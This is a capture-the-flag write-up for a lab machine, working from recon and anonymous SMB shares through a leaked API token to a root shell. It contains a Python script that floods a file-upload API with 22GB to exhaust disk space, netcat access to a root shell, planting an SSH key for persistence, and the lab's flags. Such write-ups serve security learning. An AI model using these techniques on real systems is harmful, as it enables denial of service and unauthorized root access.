# ll104567

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.148:80
Open 10.0.2.148:445
Open 10.0.2.148:1045
Open 10.0.2.148:22
Open 10.0.2.148:139
Open 10.0.2.148:61208
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.148
PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp    open  http        syn-ack Apache httpd 2.4.62 ((Debian))
|_http-title: \xE5\x90\x8D\xE5\xAD\x97Gay\xE6\x8C\x87\xE6\x95\xB0\xE8\xAE\xA1\xE7\xAE\x97\xE5\x99\xA8
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.62 (Debian)
139/tcp   open  netbios-ssn syn-ack Samba smbd 4
445/tcp   open  netbios-ssn syn-ack Samba smbd 4
1045/tcp  open  http        syn-ack Werkzeug httpd 3.1.3 (Python 3.9.2)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/3.1.3 Python/3.9.2
|_http-cors: GET PUT OPTIONS
61208/tcp open  http        syn-ack Uvicorn
| http-methods: 
|_  Supported Methods: GET
|_http-server-header: uvicorn
|_http-title: Glances
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: 104567, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   104567<00>           Flags: <unique><active>
|   104567<03>           Flags: <unique><active>
|   104567<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56976/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 61473/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 13515/udp): CLEAN (Failed to receive data)
|   Check 4 (port 39961/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-12-22T20:38:20
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 0s
```
:::

## SMB (Anonymous)

```bash
└─$ netexec smb 10.0.2.148 -u '' -p '' --shares
SMB         10.0.2.148      445    104567           [*] Unix - Samba (name:104567) (domain:) (signing:False) (SMBv1:False)
SMB         10.0.2.148      445    104567           [+] \:
SMB         10.0.2.148      445    104567           [*] Enumerated shares
SMB         10.0.2.148      445    104567           Share           Permissions     Remark
SMB         10.0.2.148      445    104567           -----           -----------     ------
SMB         10.0.2.148      445    104567           print$                          Printer Drivers
SMB         10.0.2.148      445    104567           user_files      READ            User Files Share
SMB         10.0.2.148      445    104567           IPC$                            IPC Service (Samba 4.13.13-Debian)

└─$ impacket-smbclient ''/'':''@'10.0.2.148'
# use user_files
# ls
drw-rw-rw-          0  Sat Aug 23 13:04:53 2025 .
drw-rw-rw-          0  Wed Aug 27 01:35:48 2025 ..
```

Empty

Path leaked via `rpcclient`
```bash
└─$ rpcclient -U '' 10.0.2.148
Password for [WORKGROUP\]:
rpcclient $> netshareenumall
netname: print$
	remark:	Printer Drivers
	path:	C:\var\lib\samba\printers
	password:	
netname: user_files
	remark:	User Files Share
	path:	C:\home\ll\user_files
	password:	
netname: IPC$
	remark:	IPC Service (Samba 4.13.13-Debian)
	path:	C:\tmp
	password:	
```

## HTTP (80)

Some kind of troll website

![writeup.png](/assets/pentest/hackmyvm/ll104567/writeup.png)

When you share the contents is Base64 encoded and shared that way.
```js
async function handleShare() {
	const name = resultName.textContent;
	// const percentage = parseInt(percentageText.textContent); // 不再需要
	// const message = resultMessage.textContent; // 不再需要

	if (!name) { // 只检查名字
		alert('请先计算一个结果再分享！');
		return;
	}

	const dataToEncode = `name=${encodeURIComponent(name)}`; // 只编码名字
	const encodedData = encodeBase64(dataToEncode);
	const shareUrl = `${window.location.origin}${window.location.pathname}?data=${encodedData}`;

	try {
		await navigator.clipboard.writeText(shareUrl);
		alert('分享链接已复制到剪贴板：' + shareUrl);
	} catch (error) {
		alert('复制链接失败，请手动复制。');
		console.error('Copy to clipboard failed:', error);
	}
}
```

History saves `data` as HTML elements 
```js
function renderHistory() {
	const history = JSON.parse(localStorage.getItem('gayIndexHistory') || '[]');
	historyList.innerHTML = ''; // 清空现有列表
	if (history.length === 0) {
		historyList.innerHTML = '<li class="text-gray-500">暂无历史记录</li>';
		return;
	}
	history.forEach((item, index) => {
		const listItem = document.createElement('li');
		listItem.className = 'p-2 bg-gray-700 rounded-md flex justify-between items-center cursor-pointer hover:bg-gray-600 transition duration-200';
		listItem.innerHTML = `
			<div class="flex-grow min-w-0">
				<span class="font-semibold text-purple-300">${item.name}</span>: 
				<span class="font-bold text-white">${item.percentage}%</span>
				<p class="text-xs text-gray-400 mt-1 truncate">${item.message}</p>
			</div>
			<button class="recall-history text-purple-400 hover:text-purple-300 text-sm flex-shrink-0 whitespace-nowrap ml-2 px-3 py-1 rounded-md border border-purple-400 hover:bg-purple-700 transition duration-200" data-index="${index}">查看</button>
		`;
		historyList.appendChild(listItem);
	});
}
```

![writeup-1.png](/assets/pentest/hackmyvm/ll104567/writeup-1.png)

Possible XSS/CSRF if there's other accounts.

Comments:
```bash
└─$ curl 10.0.2.148 -s | grep '<!--' | trans -b :en
<!-- xixilake-session-secure-2025 -->
<!-- New top navigation container -->
<!-- History collapsible bar container -->
<!-- History items will be inserted here by JS -->
<!-- Share button container -->
<!-- Added container-fade-in class to implement entry animation -->
<!-- Header -->
<!-- Input Form -->
<!-- Added active:scale-95 to achieve button press effect -->
<!-- Result Section -->
```

## HTTP (61208)

Some kind of monitoring software?

![writeup-2.png](/assets/pentest/hackmyvm/ll104567/writeup-2.png)

- [http://10.0.2.148:61208/docs](http://10.0.2.148:61208/docs) exposes API 

Processes:
```bash
└─$ curl -s 'http://10.0.2.148:61208/api/4/all' | jq '.processlist[] | select(.cmdline | length > 0) | {username: .username, cmdline: (.cmdline | join(" "))}' -c | sort | uniq
{"username":"ll","cmdline":"/usr/bin/python3 /home/ll/app.py"}
{"username":"messagebus","cmdline":"/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"}
{"username":"root","cmdline":"/bin/sh -c sleep 30 && /usr/local/bin/glances -w"}
{"username":"root","cmdline":"/lib/systemd/systemd-journald"}
{"username":"root","cmdline":"/lib/systemd/systemd-logind"}
{"username":"root","cmdline":"/lib/systemd/systemd-udevd"}
{"username":"root","cmdline":"/sbin/agetty -o -p -- \\u --noclear tty1 linux"}
{"username":"root","cmdline":"/sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3"}
{"username":"root","cmdline":"/sbin/init"}
{"username":"root","cmdline":"sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"}
{"username":"root","cmdline":"/usr/bin/python3 /usr/local/bin/glances -w"}
{"username":"root","cmdline":"/usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal"}
{"username":"root","cmdline":"/usr/sbin/apache2 -k start"}
{"username":"root","cmdline":"/usr/sbin/cron -f"}
{"username":"root","cmdline":"/usr/sbin/CRON -f"}
{"username":"root","cmdline":"/usr/sbin/nmbd --foreground --no-process-group"}
{"username":"root","cmdline":"/usr/sbin/rsyslogd -n -iNONE"}
{"username":"root","cmdline":"/usr/sbin/smbd --foreground --no-process-group"}
{"username":"systemd-timesync","cmdline":"/lib/systemd/systemd-timesyncd"}
{"username":"www-data","cmdline":"/usr/sbin/apache2 -k start"}
```

This doesn't seem to have anything interesting, except for a potential username `ll`

## HTTP (1045)

```bash
└─$ feroxbuster -u http://10.0.2.148:1045 --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Nothing
```

Usually I scan web applications and ignore 403, bad practice but also avoids lots of noise. Anyway also match `403` because API's return this status code.
```bash
└─$ feroxbuster -u http://10.0.2.148:1045 --thorough -D -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
403      GET        1l        2w       48c http://10.0.2.148:1045/api
```

```bash
└─$ feroxbuster -u http://10.0.2.148:1045/api --thorough -D -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
403      GET        1l        2w       48c http://10.0.2.148:1045/api
200      GET        1l        6w      210c http://10.0.2.148:1045/api/health
```

```bash
└─$ curl 10.0.2.148:1045/api/health -s | jq
{
  "available_endpoints": {
    "/api": "API information",
    "/api/files/": "File operations",
    "/api/health": "Health check"
  },
  "service": "XixiLakeTech FileSync API",
  "status": "healthy",
  "timestamp": "2025-12-22T21:15:49.200386"
}
```

```bash
└─$ curl 10.0.2.148:1045/api/files/hello -i
HTTP/1.1 401 UNAUTHORIZED
Server: Werkzeug/3.1.3 Python/3.9.2
Date: Mon, 22 Dec 2025 21:16:29 GMT
Content-Type: application/json
Content-Length: 32
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, PUT, MOVE, OPTIONS
Access-Control-Allow-Headers: Content-Type, X-Session-Token, Destination
Access-Control-Max-Age: 86400
Connection: close

{"error":"Unauthorized access"}
```

```bash
└─$ curl 10.0.2.148:1045/api/files/hello -H 'X-Session-Token: xixilake-session-secure-2025'
{"error":"File not found"}
```

We are able to upload files
```bash
└─$ curl 10.0.2.148:1045/api/files/hello -H 'X-Session-Token: xixilake-session-secure-2025' --upload-file y -s
{"message":"File hello uploaded successfully"}

└─$ curl 10.0.2.148:1045/api/files/y -H 'X-Session-Token: xixilake-session-secure-2025'
{"error":"File not found"}

└─$ curl 10.0.2.148:1045/api/files/hello -H 'X-Session-Token: xixilake-session-secure-2025'
x
```

Files are uploaded to SMB
```bash
└─$ impacket-smbclient ''/'':''@'10.0.2.148'
# use user_files
# ls
drw-rw-rw-          0  Mon Dec 22 16:19:04 2025 .
drw-rw-rw-          0  Wed Aug 27 01:35:48 2025 ..
-rw-rw-rw-          2  Mon Dec 22 16:19:09 2025 hello
```

Try uploading SSH key to the potential user?
```bash
└─$ gen_ssh_deploy
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
echo "mkdir -p ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDcTmAaGrji6ShoCEIjgmBFKSC8FhrG5gLk4xN0dcWR3 woyag@kraken' >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys"
```

Specifying the directory doesn't work
```bash
└─$ curl -H 'X-Session-Token: xixilake-session-secure-2025' 10.0.2.148:1045/api/files/authorized_keys -H 'Destination: /home/ll/.ssh' -T id_rsa.pub
{"message":"File authorized_keys uploaded successfully"}
└─$ ssh -i id_rsa ll@10.0.2.148
ll@10.0.2.148's password:
```

Specifying the file path doesn't work
```bash
└─$ curl -H 'X-Session-Token: xixilake-session-secure-2025' 10.0.2.148:1045/api/files/authorized_keys -H 'Destination: /home/ll/.ssh/authorized_keys' -T id_rsa.pub -s
{"message":"File authorized_keys uploaded successfully"}
└─$ ssh -i id_rsa ll@10.0.2.148
ll@10.0.2.148's password:
```

Allowed methods includes `MOVE` which is not a standard method
```http
Access-Control-Allow-Methods: GET, PUT, MOVE, OPTIONS
```

Hmmm
```bash
└─$ curl -H 'X-Session-Token: xixilake-session-secure-2025' 10.0.2.148:1045/api/files/authorized_keys -H 'Destination: /home/ll/.ssh' -T id_rsa.pub -s -X MOVE
{"error":"Failed to move file: [Errno 13] Permission denied: '/home/ll/.ssh/authorized_keys'"}

└─$ curl -H 'X-Session-Token: xixilake-session-secure-2025' 10.0.2.148:1045/api/files/authorized_keys -H 'Destination: /home/ll/.ssh' -s -X MOVE
{"error":"Failed to move file: [Errno 13] Permission denied: '/home/ll/.ssh/authorized_keys'"}
```

```bash
└─$ curl -H 'X-Session-Token: xixilake-session-secure-2025' 10.0.2.148:1045/api/files/authorized_keys -H 'Destination: home/ll/.ssh' -s -X MOVE
{"message":"File moved to home/ll/.ssh"}
└─$ ssh -i id_rsa ll@10.0.2.148
ll@10.0.2.148 password:
└─$ curl -H 'X-Session-Token: xixilake-session-secure-2025' 10.0.2.148:1045/api/files/authorized_keys -H 'Destination: /home/ll/.ssh/authorized_keys' -s -X MOVE
{"error":"Source file not found"}
└─$ curl -H 'X-Session-Token: xixilake-session-secure-2025' 10.0.2.148:1045/api/files/authorized_keys -H 'Destination: /home/ll/.ssh' -T id_rsa.pub -s
{"message":"File authorized_keys uploaded successfully"}
└─$ curl -H 'X-Session-Token: xixilake-session-secure-2025' 10.0.2.148:1045/api/files/authorized_keys -H 'Destination: /../home/ll/.ssh/authorized_keys' -s -X MOVE
{"error":"Directory traversal not allowed"}
└─$ curl -H 'X-Session-Token: xixilake-session-secure-2025' 10.0.2.148:1045/api/files/authorized_keys -H 'Destination: home/ll/.ssh/authorized_keys' -s -X MOVE
{"error":"Failed to move file: [Errno 17] File exists: 'user_files/home/ll/.ssh'"}
```

We can upload files to `user_files/*`, but not outside. `MOVE` moves the files if they exists and prevents overwrite.

```bash
└─$ fallocate -l 1G 1GB.bin
└─$ curl -H 'X-Session-Token: xixilake-session-secure-2025' 10.0.2.152:1045/api/files/authorized_keys -T 1GB.bin -s
{"error":"File too large"}
```

## HTTP (61208) (Stress Test)

In the config of this application is `warning_action` which exposes port `4567` which is running as root.

![writeup-3.png](/assets/pentest/hackmyvm/ll104567/writeup-3.png)

The file system usage is shown on dashboard

![writeup-4.png](/assets/pentest/hackmyvm/ll104567/writeup-4.png)

80% of 29 = 23.3

Let's upload 22GB which will overflow the file system and trigger port to open (hopefully)

Vibecode curl commands for stresser script
```python
import asyncio
import aiohttp
from time import time

async def upload_chunk(session, chunk_data, file_num, chunk_num):
    try:
        async with session.put(
            f'http://10.0.2.152:1045/api/files/{file_num}_{chunk_num}.bin',
            headers={'X-Session-Token': 'xixilake-session-secure-2025'},
            data=chunk_data
        ) as response:
            # Don't wait for response body if you don't need it
            await response.read()
            return response.status
    except Exception as e:
        print(f"Error uploading file {file_num}, chunk {chunk_num}: {e}")
        return None

async def stress_test(total_gb, chunk_size_mb, concurrent_uploads):
    # Read chunk once
    with open("1MB.bin", "rb") as f:
        chunk_data = f.read()
    
    total_chunks = (total_gb * 1024) // chunk_size_mb
    start_time = time()
    
    # Optimize connection settings
    connector = aiohttp.TCPConnector(
        limit=concurrent_uploads,  # Connection pool limit
        ttl_dns_cache=300,         # DNS cache
        force_close=False,         # Reuse connections
        enable_cleanup_closed=True
    )
    
    timeout = aiohttp.ClientTimeout(total=60, connect=10)
    
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout
    ) as session:
        # Create all tasks upfront
        tasks = [
            upload_chunk(session, chunk_data, i // concurrent_uploads, i % concurrent_uploads)
            for i in range(total_chunks)
        ]
        
        # Process in batches with progress reporting
        completed = 0
        for i in range(0, len(tasks), concurrent_uploads):
            batch = tasks[i:i + concurrent_uploads]
            await asyncio.gather(*batch)
            completed += len(batch)
            
            elapsed = time() - start_time
            speed = (completed * chunk_size_mb / 1024) / elapsed if elapsed > 0 else 0
            print(f"Progress: {completed}/{total_chunks} chunks ({speed:.2f} GB/s)")
    
    elapsed = time() - start_time
    total_gb_actual = total_chunks * chunk_size_mb / 1024
    avg_speed = total_gb_actual / elapsed if elapsed > 0 else 0
    
    print("\nStress test complete:")
    print(f"  Total: {total_gb_actual:.2f} GB")
    print(f"  Time: {elapsed:.2f}s")
    print(f"  Avg Speed: {avg_speed:.2f} GB/s")

if __name__ == "__main__":
    asyncio.run(stress_test(total_gb=22, chunk_size_mb=1, concurrent_uploads=50))
```

```bash
Stress test complete:
  Total: 22.00 GB
  Time: 546.43s
  Avg Speed: 0.04 GB/s
```

```bash
└─$ nc 10.0.2.152 4567
$ id
uid=0(root) gid=0(root) groups=0(root)
$ grep root /etc/ssh/sshd_config -i
PermitRootLogin yes
# the setting of "PermitRootLogin without-password".
#ChrootDirectory none
$ cd .ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDcTmAaGrji6ShoCEIjgmBFKSC8FhrG5gLk4xN0dcWR3 woyag@kraken' >> ~/.ssh/authorized_keys
```

> **Note**: Make sure not to `Ctrl+C` or you f-ed up. From what I saw the port only opens once when it's above 80%.

```bash
└─$ ssh -i id_rsa root@10.0.2.152
root@104567:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flags

```bash
root@104567:~# cat /home/ll/user.txt
flag{user-bc3c292e432690a9a0444bb46a559061}
root@104567:~# cat /root/root.txt
flag{root-f526a6c9f285aa9d001a459b42ef3035}
```

## Post Exploitation

The user `.ssh` directory is owned by root, hence permission errors.
```bash
root@104567:/home/ll# ls -alh
total 644K
drwxr-xr-x 4 ll   ll   4.0K Aug 27 01:35 .
drwxr-xr-x 3 root root 4.0K Aug 22 08:03 ..
-rw-r--r-- 1 ll   ll   3.4K Aug 27 01:35 app.py
lrwxrwxrwx 1 root root    9 Aug 22 07:54 .bash_history -> /dev/null
-rw-r--r-- 1 ll   ll    220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 ll   ll   3.5K Apr 18  2019 .bashrc
-rw-r--r-- 1 ll   ll    807 Apr 18  2019 .profile
drw------- 2 root root 4.0K Aug 23 09:23 .ssh
drwxr-xr-x 2 ll   ll   608K Dec 23 07:46 user_files
-rw-r--r-- 1 root root   44 Aug 22 07:53 user.txt
```

`app.py`
```python
from flask import Flask, request, Response, jsonify
import os
import shutil
from datetime import datetime

app = Flask(__name__)

UPLOAD_DIR = "user_files"
MAX_FILE_SIZE = 1024 * 1024
SESSION_TOKEN = "xixilake-session-secure-2025"

if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)

def resolve_path(filename):
    if '..' in filename:
        raise ValueError("Directory traversal not allowed")
    if filename.startswith('/') or (len(filename) > 1 and filename[1] == ':'):
        return filename
    return os.path.join(UPLOAD_DIR, filename)

@app.after_request
def after_request(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, PUT, MOVE, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, X-Session-Token, Destination'
    response.headers['Access-Control-Max-Age'] = '86400'
    return response

@app.route('/api', methods=['GET'])
def api_root():
    return jsonify({
        "error": "Forbidden",
        "message": "Access denied"
    }), 403

@app.route('/api/files/<path:filename>', methods=['GET', 'PUT', 'MOVE'])
def handle_file(filename):
    auth_token = request.headers.get('X-Session-Token')
    if auth_token != SESSION_TOKEN:
        return jsonify({"error": "Unauthorized access"}), 401

    try:
        file_path = resolve_path(filename)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

    if request.method == 'GET':
        if not os.path.exists(file_path):
            return jsonify({"error": "File not found"}), 404
        with open(file_path, 'rb') as f:
            content = f.read()
        return Response(content, mimetype='text/plain')

    elif request.method == 'PUT':
        content = request.get_data()
        if len(content) > MAX_FILE_SIZE:
            return jsonify({"error": "File too large"}), 400
        try:
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, 'wb') as f:
                f.write(content)
            return jsonify({"message": f"File {filename} uploaded successfully"}), 200
        except Exception as e:
            return jsonify({"error": f"Failed to upload file: {str(e)}"}), 500

    elif request.method == 'MOVE':
        dest = request.headers.get('Destination')
        if not dest:
            return jsonify({"error": "Destination header missing"}), 400

        try:
            dest_path = resolve_path(dest)
        except ValueError as e:
            return jsonify({"error": str(e)}), 400

        if not os.path.exists(file_path):
            return jsonify({"error": "Source file not found"}), 404
        try:
            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
            shutil.move(file_path, dest_path)
            return jsonify({"message": f"File moved to {dest}"}), 200
        except Exception as e:
            return jsonify({"error": f"Failed to move file: {str(e)}"}), 500

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat(),
        "service": "XixiLakeTech FileSync API",
        "available_endpoints": {
            "/api": "API information",
            "/api/health": "Health check",
            "/api/files/": "File operations"
        }
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1045, debug=False)
```

## Help used

- [https://7r1umphk.github.io/post/nei-bu-\_ll104567.html](https://7r1umphk.github.io/post/nei-bu-\_ll104567.html)
- [https://mp.weixin.qq.com/s/IaOdJZSwwiq-sJMXkP1w3Q](https://mp.weixin.qq.com/s/IaOdJZSwwiq-sJMXkP1w3Q)
- [https://www.bilibili.com/video/BV1xyxYzQEGw/](www.bilibili.com/video/BV1xyxYzQEGw/)
	- Root password: `root@d4:~#`

